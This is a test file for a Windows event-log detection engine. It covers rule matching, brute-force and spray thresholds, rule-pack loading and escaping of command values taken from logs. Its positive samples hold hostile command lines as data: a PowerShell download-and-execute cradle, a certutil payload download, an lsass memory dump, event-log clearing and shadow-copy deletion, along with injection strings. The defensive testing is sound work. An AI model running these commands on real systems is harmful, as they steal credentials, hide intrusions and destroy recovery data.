import { describe, expect, it } from 'vitest'
import { analyze, buildRules } from '../src/core/analysis'
import { RuleEngine } from '../src/core/rules/engine'
import { loadPack, compilePacks } from '../src/core/rules/load'
import { escapeFor, renderAction } from '../src/core/rules/render'
import type { CanonicalEvent } from '../src/core/types'
// @ts-expect-error untyped .mjs build script
import { generate } from "../scripts/build-validator.mjs"
import fs from 'node:fs'

const T0 = Date.UTC(2025, 2, 1, 10, 0, 0)
const ev = (o: Partial<CanonicalEvent> & { eventId: number }): CanonicalEvent => ({ ts: T0, computer: 'WS1', ...o })
const run = (events: CanonicalEvent[], extra = '') => {
  const { comp } = buildRules([])
  const eng = new RuleEngine(comp.rules)
  events.forEach((e) => eng.process(e))
  return eng.finalize()
}
const ids = (events: CanonicalEvent[]) => run(events).findings.map((f) => f.ruleId)
const ps = (cmd: string, extra: Partial<CanonicalEvent> = {}) => ev({ eventId: 4688, newProcessName: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', commandLine: cmd, subjectUserName: 'bob', ...extra })
const proc = (cmd: string) => ev({ eventId: 4688, newProcessName: 'C:\\x\\a.exe', commandLine: cmd, subjectUserName: 'bob' })

describe('starter pack: each match rule fires on a positive and stays quiet on a benign sample', () => {
  const cases: [string, CanonicalEvent, CanonicalEvent][] = [
    ['AUD-001', ev({ eventId: 1102 }), ev({ eventId: 4624, logonType: 2 })],
    ['AUD-002', ev({ eventId: 4719 }), ev({ eventId: 4720 })],
    ['AUTH-003', ev({ eventId: 4648, subjectUserName: 'alice' }), ev({ eventId: 4648, subjectUserName: 'WS1$' })],
    ['AUTH-004', ev({ eventId: 4624, logonType: 10, ipAddress: '8.8.8.8' }), ev({ eventId: 4624, logonType: 10, ipAddress: '10.1.2.3' })],
    ['AUTH-005', ev({ eventId: 4624, logonType: 3, authenticationPackage: 'NTLM', targetUserName: 'admin' }), ev({ eventId: 4624, logonType: 3, authenticationPackage: 'Kerberos', targetUserName: 'admin' })],
    ['PRIV-001', ev({ eventId: 4672, subjectUserName: 'bob' }), ev({ eventId: 4672, subjectUserName: 'SYSTEM' })],
    ['PERS-001', ev({ eventId: 7045, serviceName: 'x' }), ev({ eventId: 4624 })],
    ['PERS-002', ev({ eventId: 4698 }), ev({ eventId: 4699 })],
    ['ACC-001', ev({ eventId: 4720, targetUserName: 'newuser' }), ev({ eventId: 4722 })],
    ['ACC-002', ev({ eventId: 4732, targetUserName: 'Administrators' }), ev({ eventId: 4732, targetUserName: 'Print Users' })],
    ['EXEC-001', ps('powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://x\')"'), ps('powershell Get-Process')],
    ['EXEC-001', ps('powershell -enc ' + 'QUJD'.repeat(15)), ps('powershell -ExecutionPolicy Bypass -File backup.ps1')],
    ['EXEC-002', proc('certutil.exe -urlcache -split -f http://x/a.exe a.exe'), proc('certutil -dump cert.cer')],
    ['EXEC-003', ev({ eventId: 4688, parentProcessName: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE', newProcessName: 'C:\\Windows\\System32\\cmd.exe' }), ev({ eventId: 4688, parentProcessName: 'C:\\Windows\\explorer.exe', newProcessName: 'C:\\Windows\\System32\\cmd.exe' })],
    ['CRED-001', proc('procdump.exe -ma lsass.exe l.dmp'), proc('procdump.exe -ma myapp.exe')],
    ['DISC-001', proc('net group "Domain Admins" /domain'), proc('net use z: \\\\fs\\share')],
    ['EVAS-001', proc('wevtutil cl Security'), proc('wevtutil qe Security')],
    ['IMP-001', proc('vssadmin.exe delete shadows /all /quiet'), proc('vssadmin list shadows')],
  ]
  for (const [id, pos, neg] of cases) {
    it(`${id}`, () => {
      expect(ids([pos])).toContain(id)
      expect(ids([neg])).not.toContain(id)
    })
  }
  it('PowerShell rule requires a PowerShell process', () => {
    expect(ids([proc('foo -enc ' + 'QUJD'.repeat(15))])).not.toContain('EXEC-001')
  })
  it('every ATT&CK mapping on findings is resolved to names', () => {
    const f = run([ev({ eventId: 1102 })]).findings[0]!
    expect(f.attack[0]).toMatchObject({ tactic: 'TA0005', tacticName: 'Defense Evasion', technique: 'T1070.001', techniqueName: 'Clear Windows Event Logs' })
  })
})

describe('threshold rules', () => {
  const fail = (i: number, o: Partial<CanonicalEvent> = {}) => ev({ eventId: 4625, ts: T0 + i * 1000, targetUserName: 'admin', ipAddress: '1.2.3.4', ...o })
  it('brute force: fires at 10 within 5 minutes, not at 9', () => {
    expect(ids(Array.from({ length: 9 }, (_, i) => fail(i)))).not.toContain('AUTH-001')
    const r = run(Array.from({ length: 10 }, (_, i) => fail(i))).findings.find((f) => f.ruleId === 'AUTH-001')!
    expect(r).toMatchObject({ count: 10, group: { targetUserName: 'admin', ipAddress: '1.2.3.4' } })
    expect(r.evidence.length).toBe(10)
  })
  it('does not fire when the events are spread wider than the window', () => {
    expect(ids(Array.from({ length: 10 }, (_, i) => fail(i * 60)))).not.toContain('AUTH-001') // 1/min*10 -> only 5 per 5 min
  })
  it('is independent of input order (SIEM exports are often newest-first)', () => {
    const evs = Array.from({ length: 12 }, (_, i) => fail(i)).reverse()
    expect(run(evs).findings.find((f) => f.ruleId === 'AUTH-001')?.count).toBe(12)
  })
  it('two separate bursts of the same group yield two findings', () => {
    const evs = [...Array.from({ length: 10 }, (_, i) => fail(i)), ...Array.from({ length: 10 }, (_, i) => fail(3600 + i))]
    expect(run(evs).findings.filter((f) => f.ruleId === 'AUTH-001').length).toBe(2)
  })
  it('spray counts DISTINCT accounts, not events', () => {
    const same = Array.from({ length: 30 }, (_, i) => fail(i))
    expect(ids(same)).not.toContain('AUTH-002')
    const many = Array.from({ length: 12 }, (_, i) => fail(i, { targetUserName: `user${i}` }))
    const f = run(many).findings.find((x) => x.ruleId === 'AUTH-002')!
    expect(f.distinctCount).toBe(12)
    expect(f.group).toEqual({ ipAddress: '1.2.3.4' })
  })
  it('events lacking a group-by field are ignored rather than grouped under "undefined"', () => {
    const evs = Array.from({ length: 20 }, (_, i) => ev({ eventId: 4625, ts: T0 + i, targetUserName: 'a' }))
    expect(ids(evs)).not.toContain('AUTH-001')
  })
  it('Kerberoasting heuristic ignores machine/krbtgt service names', () => {
    const tk = (i: number, svc: string) => ev({ eventId: 4769, ts: T0 + i * 1000, targetUserName: 'u@D', ipAddress: '10.0.0.9', serviceName: svc })
    expect(ids(Array.from({ length: 12 }, (_, i) => tk(i, `HOST${i}$`)))).not.toContain('CRED-002')
    expect(ids(Array.from({ length: 12 }, (_, i) => tk(i, `svc${i}`)))).toContain('CRED-002')
  })
})

describe('engine behaviour', () => {
  it('suppress list removes known-good activity and counts it', () => {
    const custom = JSON.stringify({ schemaVersion: '1.0', pack: { id: 'cust', name: 'c', version: '1.0.0' }, assets: { ok: ['svc_deploy'] }, rules: [{
      id: 'EXEC-001', name: 'override', kind: 'match', severity: 'low', attack: [{ tactic: 'TA0002', technique: 'T1059.001' }],
      when: { eventIds: [4688] }, suppress: [{ field: 'subjectUserName', op: 'in', value: '$lists.ok' }] }] })
    const { comp, report } = buildRules([{ name: 'cust.json', text: custom, format: 'json' }])
    expect(report.warnings.join()).toMatch(/overrides an earlier definition/)
    const eng = new RuleEngine(comp.rules)
    eng.process(proc('x')); eng.process({ ...proc('y'), subjectUserName: 'svc_deploy' })
    const f = eng.finalize().findings.find((x) => x.ruleId === 'EXEC-001')!
    expect(f).toMatchObject({ count: 1, suppressed: 1, severity: 'low' })
  })
  it('keeps the EARLIEST 25 evidence events regardless of input order and counts all', () => {
    const evs = Array.from({ length: 100 }, (_, i) => ev({ eventId: 1102, ts: T0 + i })).reverse()
    const f = run(evs).findings.find((x) => x.ruleId === 'AUD-001')!
    expect(f.count).toBe(100)
    expect(f.evidence.map((e) => e.ts)).toEqual(Array.from({ length: 25 }, (_, i) => T0 + i))
    expect(f.evidenceTruncated).toBe(true)
    expect([f.firstTs, f.lastTs]).toEqual([T0, T0 + 99])
  })
  it('sorts findings by severity then confidence', () => {
    const f = run([ev({ eventId: 4698 }), ev({ eventId: 1102 }), ev({ eventId: 4672, subjectUserName: 'bob' })]).findings.map((x) => x.severity)
    expect(f).toEqual(['critical', 'medium', 'info'])
  })
  it('end-to-end via analyze(): CSV in, findings out', async () => {
    const csv = 'EventID,TimeGenerated,Computer,CommandLine,NewProcessName\n4688,2025-03-01T10:00:00Z,WS1,vssadmin delete shadows /all,C:\\Windows\\System32\\vssadmin.exe\n4624,2025-03-01T10:00:01Z,WS1,,\n'
    const r = await analyze(new Blob([csv]), [], { format: 'csv' })
    expect(r!.findings.map((f) => f.ruleId)).toEqual(['IMP-001'])
    expect(r!.engine.eventsProcessed).toBe(2)
    expect(r!.ruleLoad.errors).toEqual([])
  })
})

describe('loader hardening', () => {
  const base = (rule: object, extra: object = {}) => JSON.stringify({ schemaVersion: '1.0', pack: { id: 'p-test', name: 'n', version: '1.0.0' }, rules: [rule], ...extra })
  const ok = { id: 'TST-001', name: 't', kind: 'match', severity: 'low', attack: [{ tactic: 'TA0002', technique: 'T1059' }], when: { eventIds: [4688] } }
  it('accepts YAML', () => {
    const yml = `schemaVersion: "1.0"\npack: { id: yaml-pack, name: Y, version: 1.0.0 }\nrules:\n  - id: TST-001\n    name: t\n    kind: match\n    severity: low\n    attack: [{ tactic: TA0002, technique: T1059 }]\n    when: { eventIds: [4688] }\n`
    expect(loadPack(yml, 'yaml').errors).toEqual([])
  })
  it('rejects schema violations with readable messages', () => {
    const r = loadPack(base({ ...ok, severity: 'urgent', id: 'bad' }), 'json', 'mine.json')
    expect(r.pack).toBeUndefined()
    expect(r.errors.join('\n')).toMatch(/mine\.json: \/rules\/0\/(severity|id)/)
  })
  it('rejects unknown ATT&CK tactic, warns on unknown technique, and kind/when mismatch', () => {
    expect(loadPack(base({ ...ok, attack: [{ tactic: 'TA9999', technique: 'T1059' }] }), 'json').errors.join()).toMatch(/unknown ATT&CK tactic/)
    expect(loadPack(base({ ...ok, attack: [{ tactic: 'TA0002', technique: 'T9999' }] }), 'json').warnings.join()).toMatch(/not in the bundled/)
    expect(loadPack(base({ ...ok, kind: 'threshold' }), 'json').errors.join()).toMatch(/kind "threshold" but .* match spec/)
  })
  it('rejects duplicate rule ids and non-JSON/oversize input', () => {
    expect(loadPack(JSON.stringify({ schemaVersion: '1.0', pack: { id: 'p-test', name: 'n', version: '1.0.0' }, rules: [ok, ok] }), 'json').errors.join()).toMatch(/duplicate/)
    expect(loadPack('{nope', 'json').errors[0]).toMatch(/cannot parse/)
    expect(loadPack('x'.repeat(2_000_001), 'json').errors[0]).toMatch(/larger than/)
  })
  it('YAML alias bombs are refused', () => {
    const bomb = 'a: &a [x,x,x,x,x,x,x,x,x]\n' + Array.from({ length: 30 }, (_, i) => `b${i}: *a`).join('\n')
    expect(loadPack(bomb, 'yaml').errors[0]).toMatch(/cannot parse|schema/)
  })
  const compileErr = (rule: object, assets?: object) => {
    const r = loadPack(base(rule, assets ? { assets } : {}), 'json')
    expect(r.errors).toEqual([])
    return compilePacks([r.pack!]).errors.join('\n')
  }
  it('compile errors are per-rule and never silently ignored', () => {
    expect(compileErr({ ...ok, when: { eventIds: [4688], condition: { field: 'comandLine', op: 'eq', value: 'x' } } })).toMatch(/unknown field "comandLine"/)
    expect(compileErr({ ...ok, when: { eventIds: [4688], condition: { field: 'commandLine', op: 'in', value: '$lists.nope' } } })).toMatch(/unknown list/)
    expect(compileErr({ ...ok, when: { eventIds: [4688], condition: { field: 'commandLine', op: 'regex', value: '(a+)+$' } } })).toMatch(/nested quantifiers/)
    expect(compileErr({ ...ok, when: { eventIds: [4688], condition: { field: 'commandLine', op: 'regex', value: 'a'.repeat(501) } } })).toMatch(/longer than/)
    expect(compileErr({ ...ok, when: { eventIds: [4688], condition: { field: 'ipAddress', op: 'cidr', value: '10.0.0.0/99' } } })).toMatch(/bad CIDR/)
    expect(compileErr({ ...ok, response: { remediate: [{ title: 't', shell: 'powershell', command: 'Stop-Process -Name {{newProcessName}}' }] } })).toMatch(/wrapped in single quotes/)
    expect(compileErr({ ...ok, response: { remediate: [{ title: 't', command: 'x {{bogus}}' }] } })).toMatch(/unknown field "bogus"/)
  })
  it('one bad rule does not take down the rest of the pack', () => {
    const p = JSON.stringify({ schemaVersion: '1.0', pack: { id: 'p-test', name: 'n', version: '1.0.0' }, rules: [
      { ...ok, id: 'TST-001', when: { eventIds: [4688], condition: { field: 'nope', op: 'exists' } } }, { ...ok, id: 'TST-002' }] })
    const c = compilePacks([loadPack(p, 'json').pack!])
    expect(c.rules.map((r) => r.def.id)).toEqual(['TST-002'])
    expect(c.errors.length).toBe(1)
  })
})

describe('command rendering (log values are attacker-controlled)', () => {
  it('PowerShell: single quotes and Unicode quote lookalikes cannot break out', () => {
    for (const q of ["'", '\u2018', '\u2019', '\u201a', '\u201b']) {
      const out = escapeFor('powershell', `a${q}; calc; '`)
      expect(out.replace(/''/g, '')).not.toMatch(/['\u2018\u2019\u201a\u201b]/)
    }
  })
  it('strips newlines/control chars and caps length', () => {
    expect(escapeFor('powershell', 'a\r\nb\u0000c')).toBe('a  b c')
    expect(escapeFor('manual', 'x'.repeat(5000)).length).toBe(512)
  })
  it('cmd: neutralises metacharacters; kql/spl escape quotes and backslashes', () => {
    expect(escapeFor('cmd', 'a&b|c"d%e')).toBe('a^&b^|c_d_e')
    expect(escapeFor('kql', 'a"b\\c')).toBe('a\\"b\\\\c')
  })
  it('fills placeholders and reports missing ones', () => {
    const r = renderAction({ title: 't', shell: 'powershell', command: "Disable-ADAccount -Identity '{{subjectUserName}}' # {{ipAddress}}" }, ev({ eventId: 1, subjectUserName: "o'brien" }))
    expect(r.command).toBe("Disable-ADAccount -Identity 'o''brien' # <ipAddress>")
    expect(r.missing).toEqual(['ipAddress'])
  })
})

describe('build hygiene', () => {
  it('generated validator is in sync with the schema', () => {
    expect(fs.readFileSync('src/generated/validateRules.js', 'utf8')).toBe(generate())
  })
  it('generated validator is self-contained (no import/require: CJS interop differs between bundlers)', () => {
    expect(fs.readFileSync('src/generated/validateRules.js', 'utf8')).not.toMatch(/\brequire\(|^import /m)
  })
  it('generated validator contains no runtime code generation', () => {
    expect(fs.readFileSync('src/generated/validateRules.js', 'utf8')).not.toMatch(/new Function|eval\(/)
  })
})

describe('scale', () => {
  it('full starter pack over 2.4M events: bounded memory, finds the seeded attack', async () => {
    const mk = (n: number, cmd: string) => Array.from({ length: n }, () => `{"EventID":4688,"TimeCreated":"2025-03-01T10:00:00Z","Computer":"H","NewProcessName":"C:\\\\x\\\\a.exe","CommandLine":"${cmd}"}\n`).join('')
    const benign = mk(100000, 'app.exe --run ' + 'x'.repeat(80))
    const parts = Array.from({ length: 24 }, () => benign)
    parts.splice(12, 0, mk(1, 'vssadmin delete shadows /all'))
    const before = process.memoryUsage().heapUsed
    const t0 = performance.now()
    const r = await analyze(new Blob(parts), [])
    const secs = (performance.now() - t0) / 1000
    const grownMB = (process.memoryUsage().heapUsed - before) / 1e6
    console.log(`2.4M events, ${r!.engine.rulesActive} rules: ${secs.toFixed(1)}s, heap growth ${grownMB.toFixed(0)} MB`)
    expect(r!.summary.parsedEvents).toBe(2_400_001)
    expect(r!.findings.map((f) => f.ruleId)).toEqual(['IMP-001'])
    expect(grownMB).toBeLessThan(150)
  }, 180000)
})
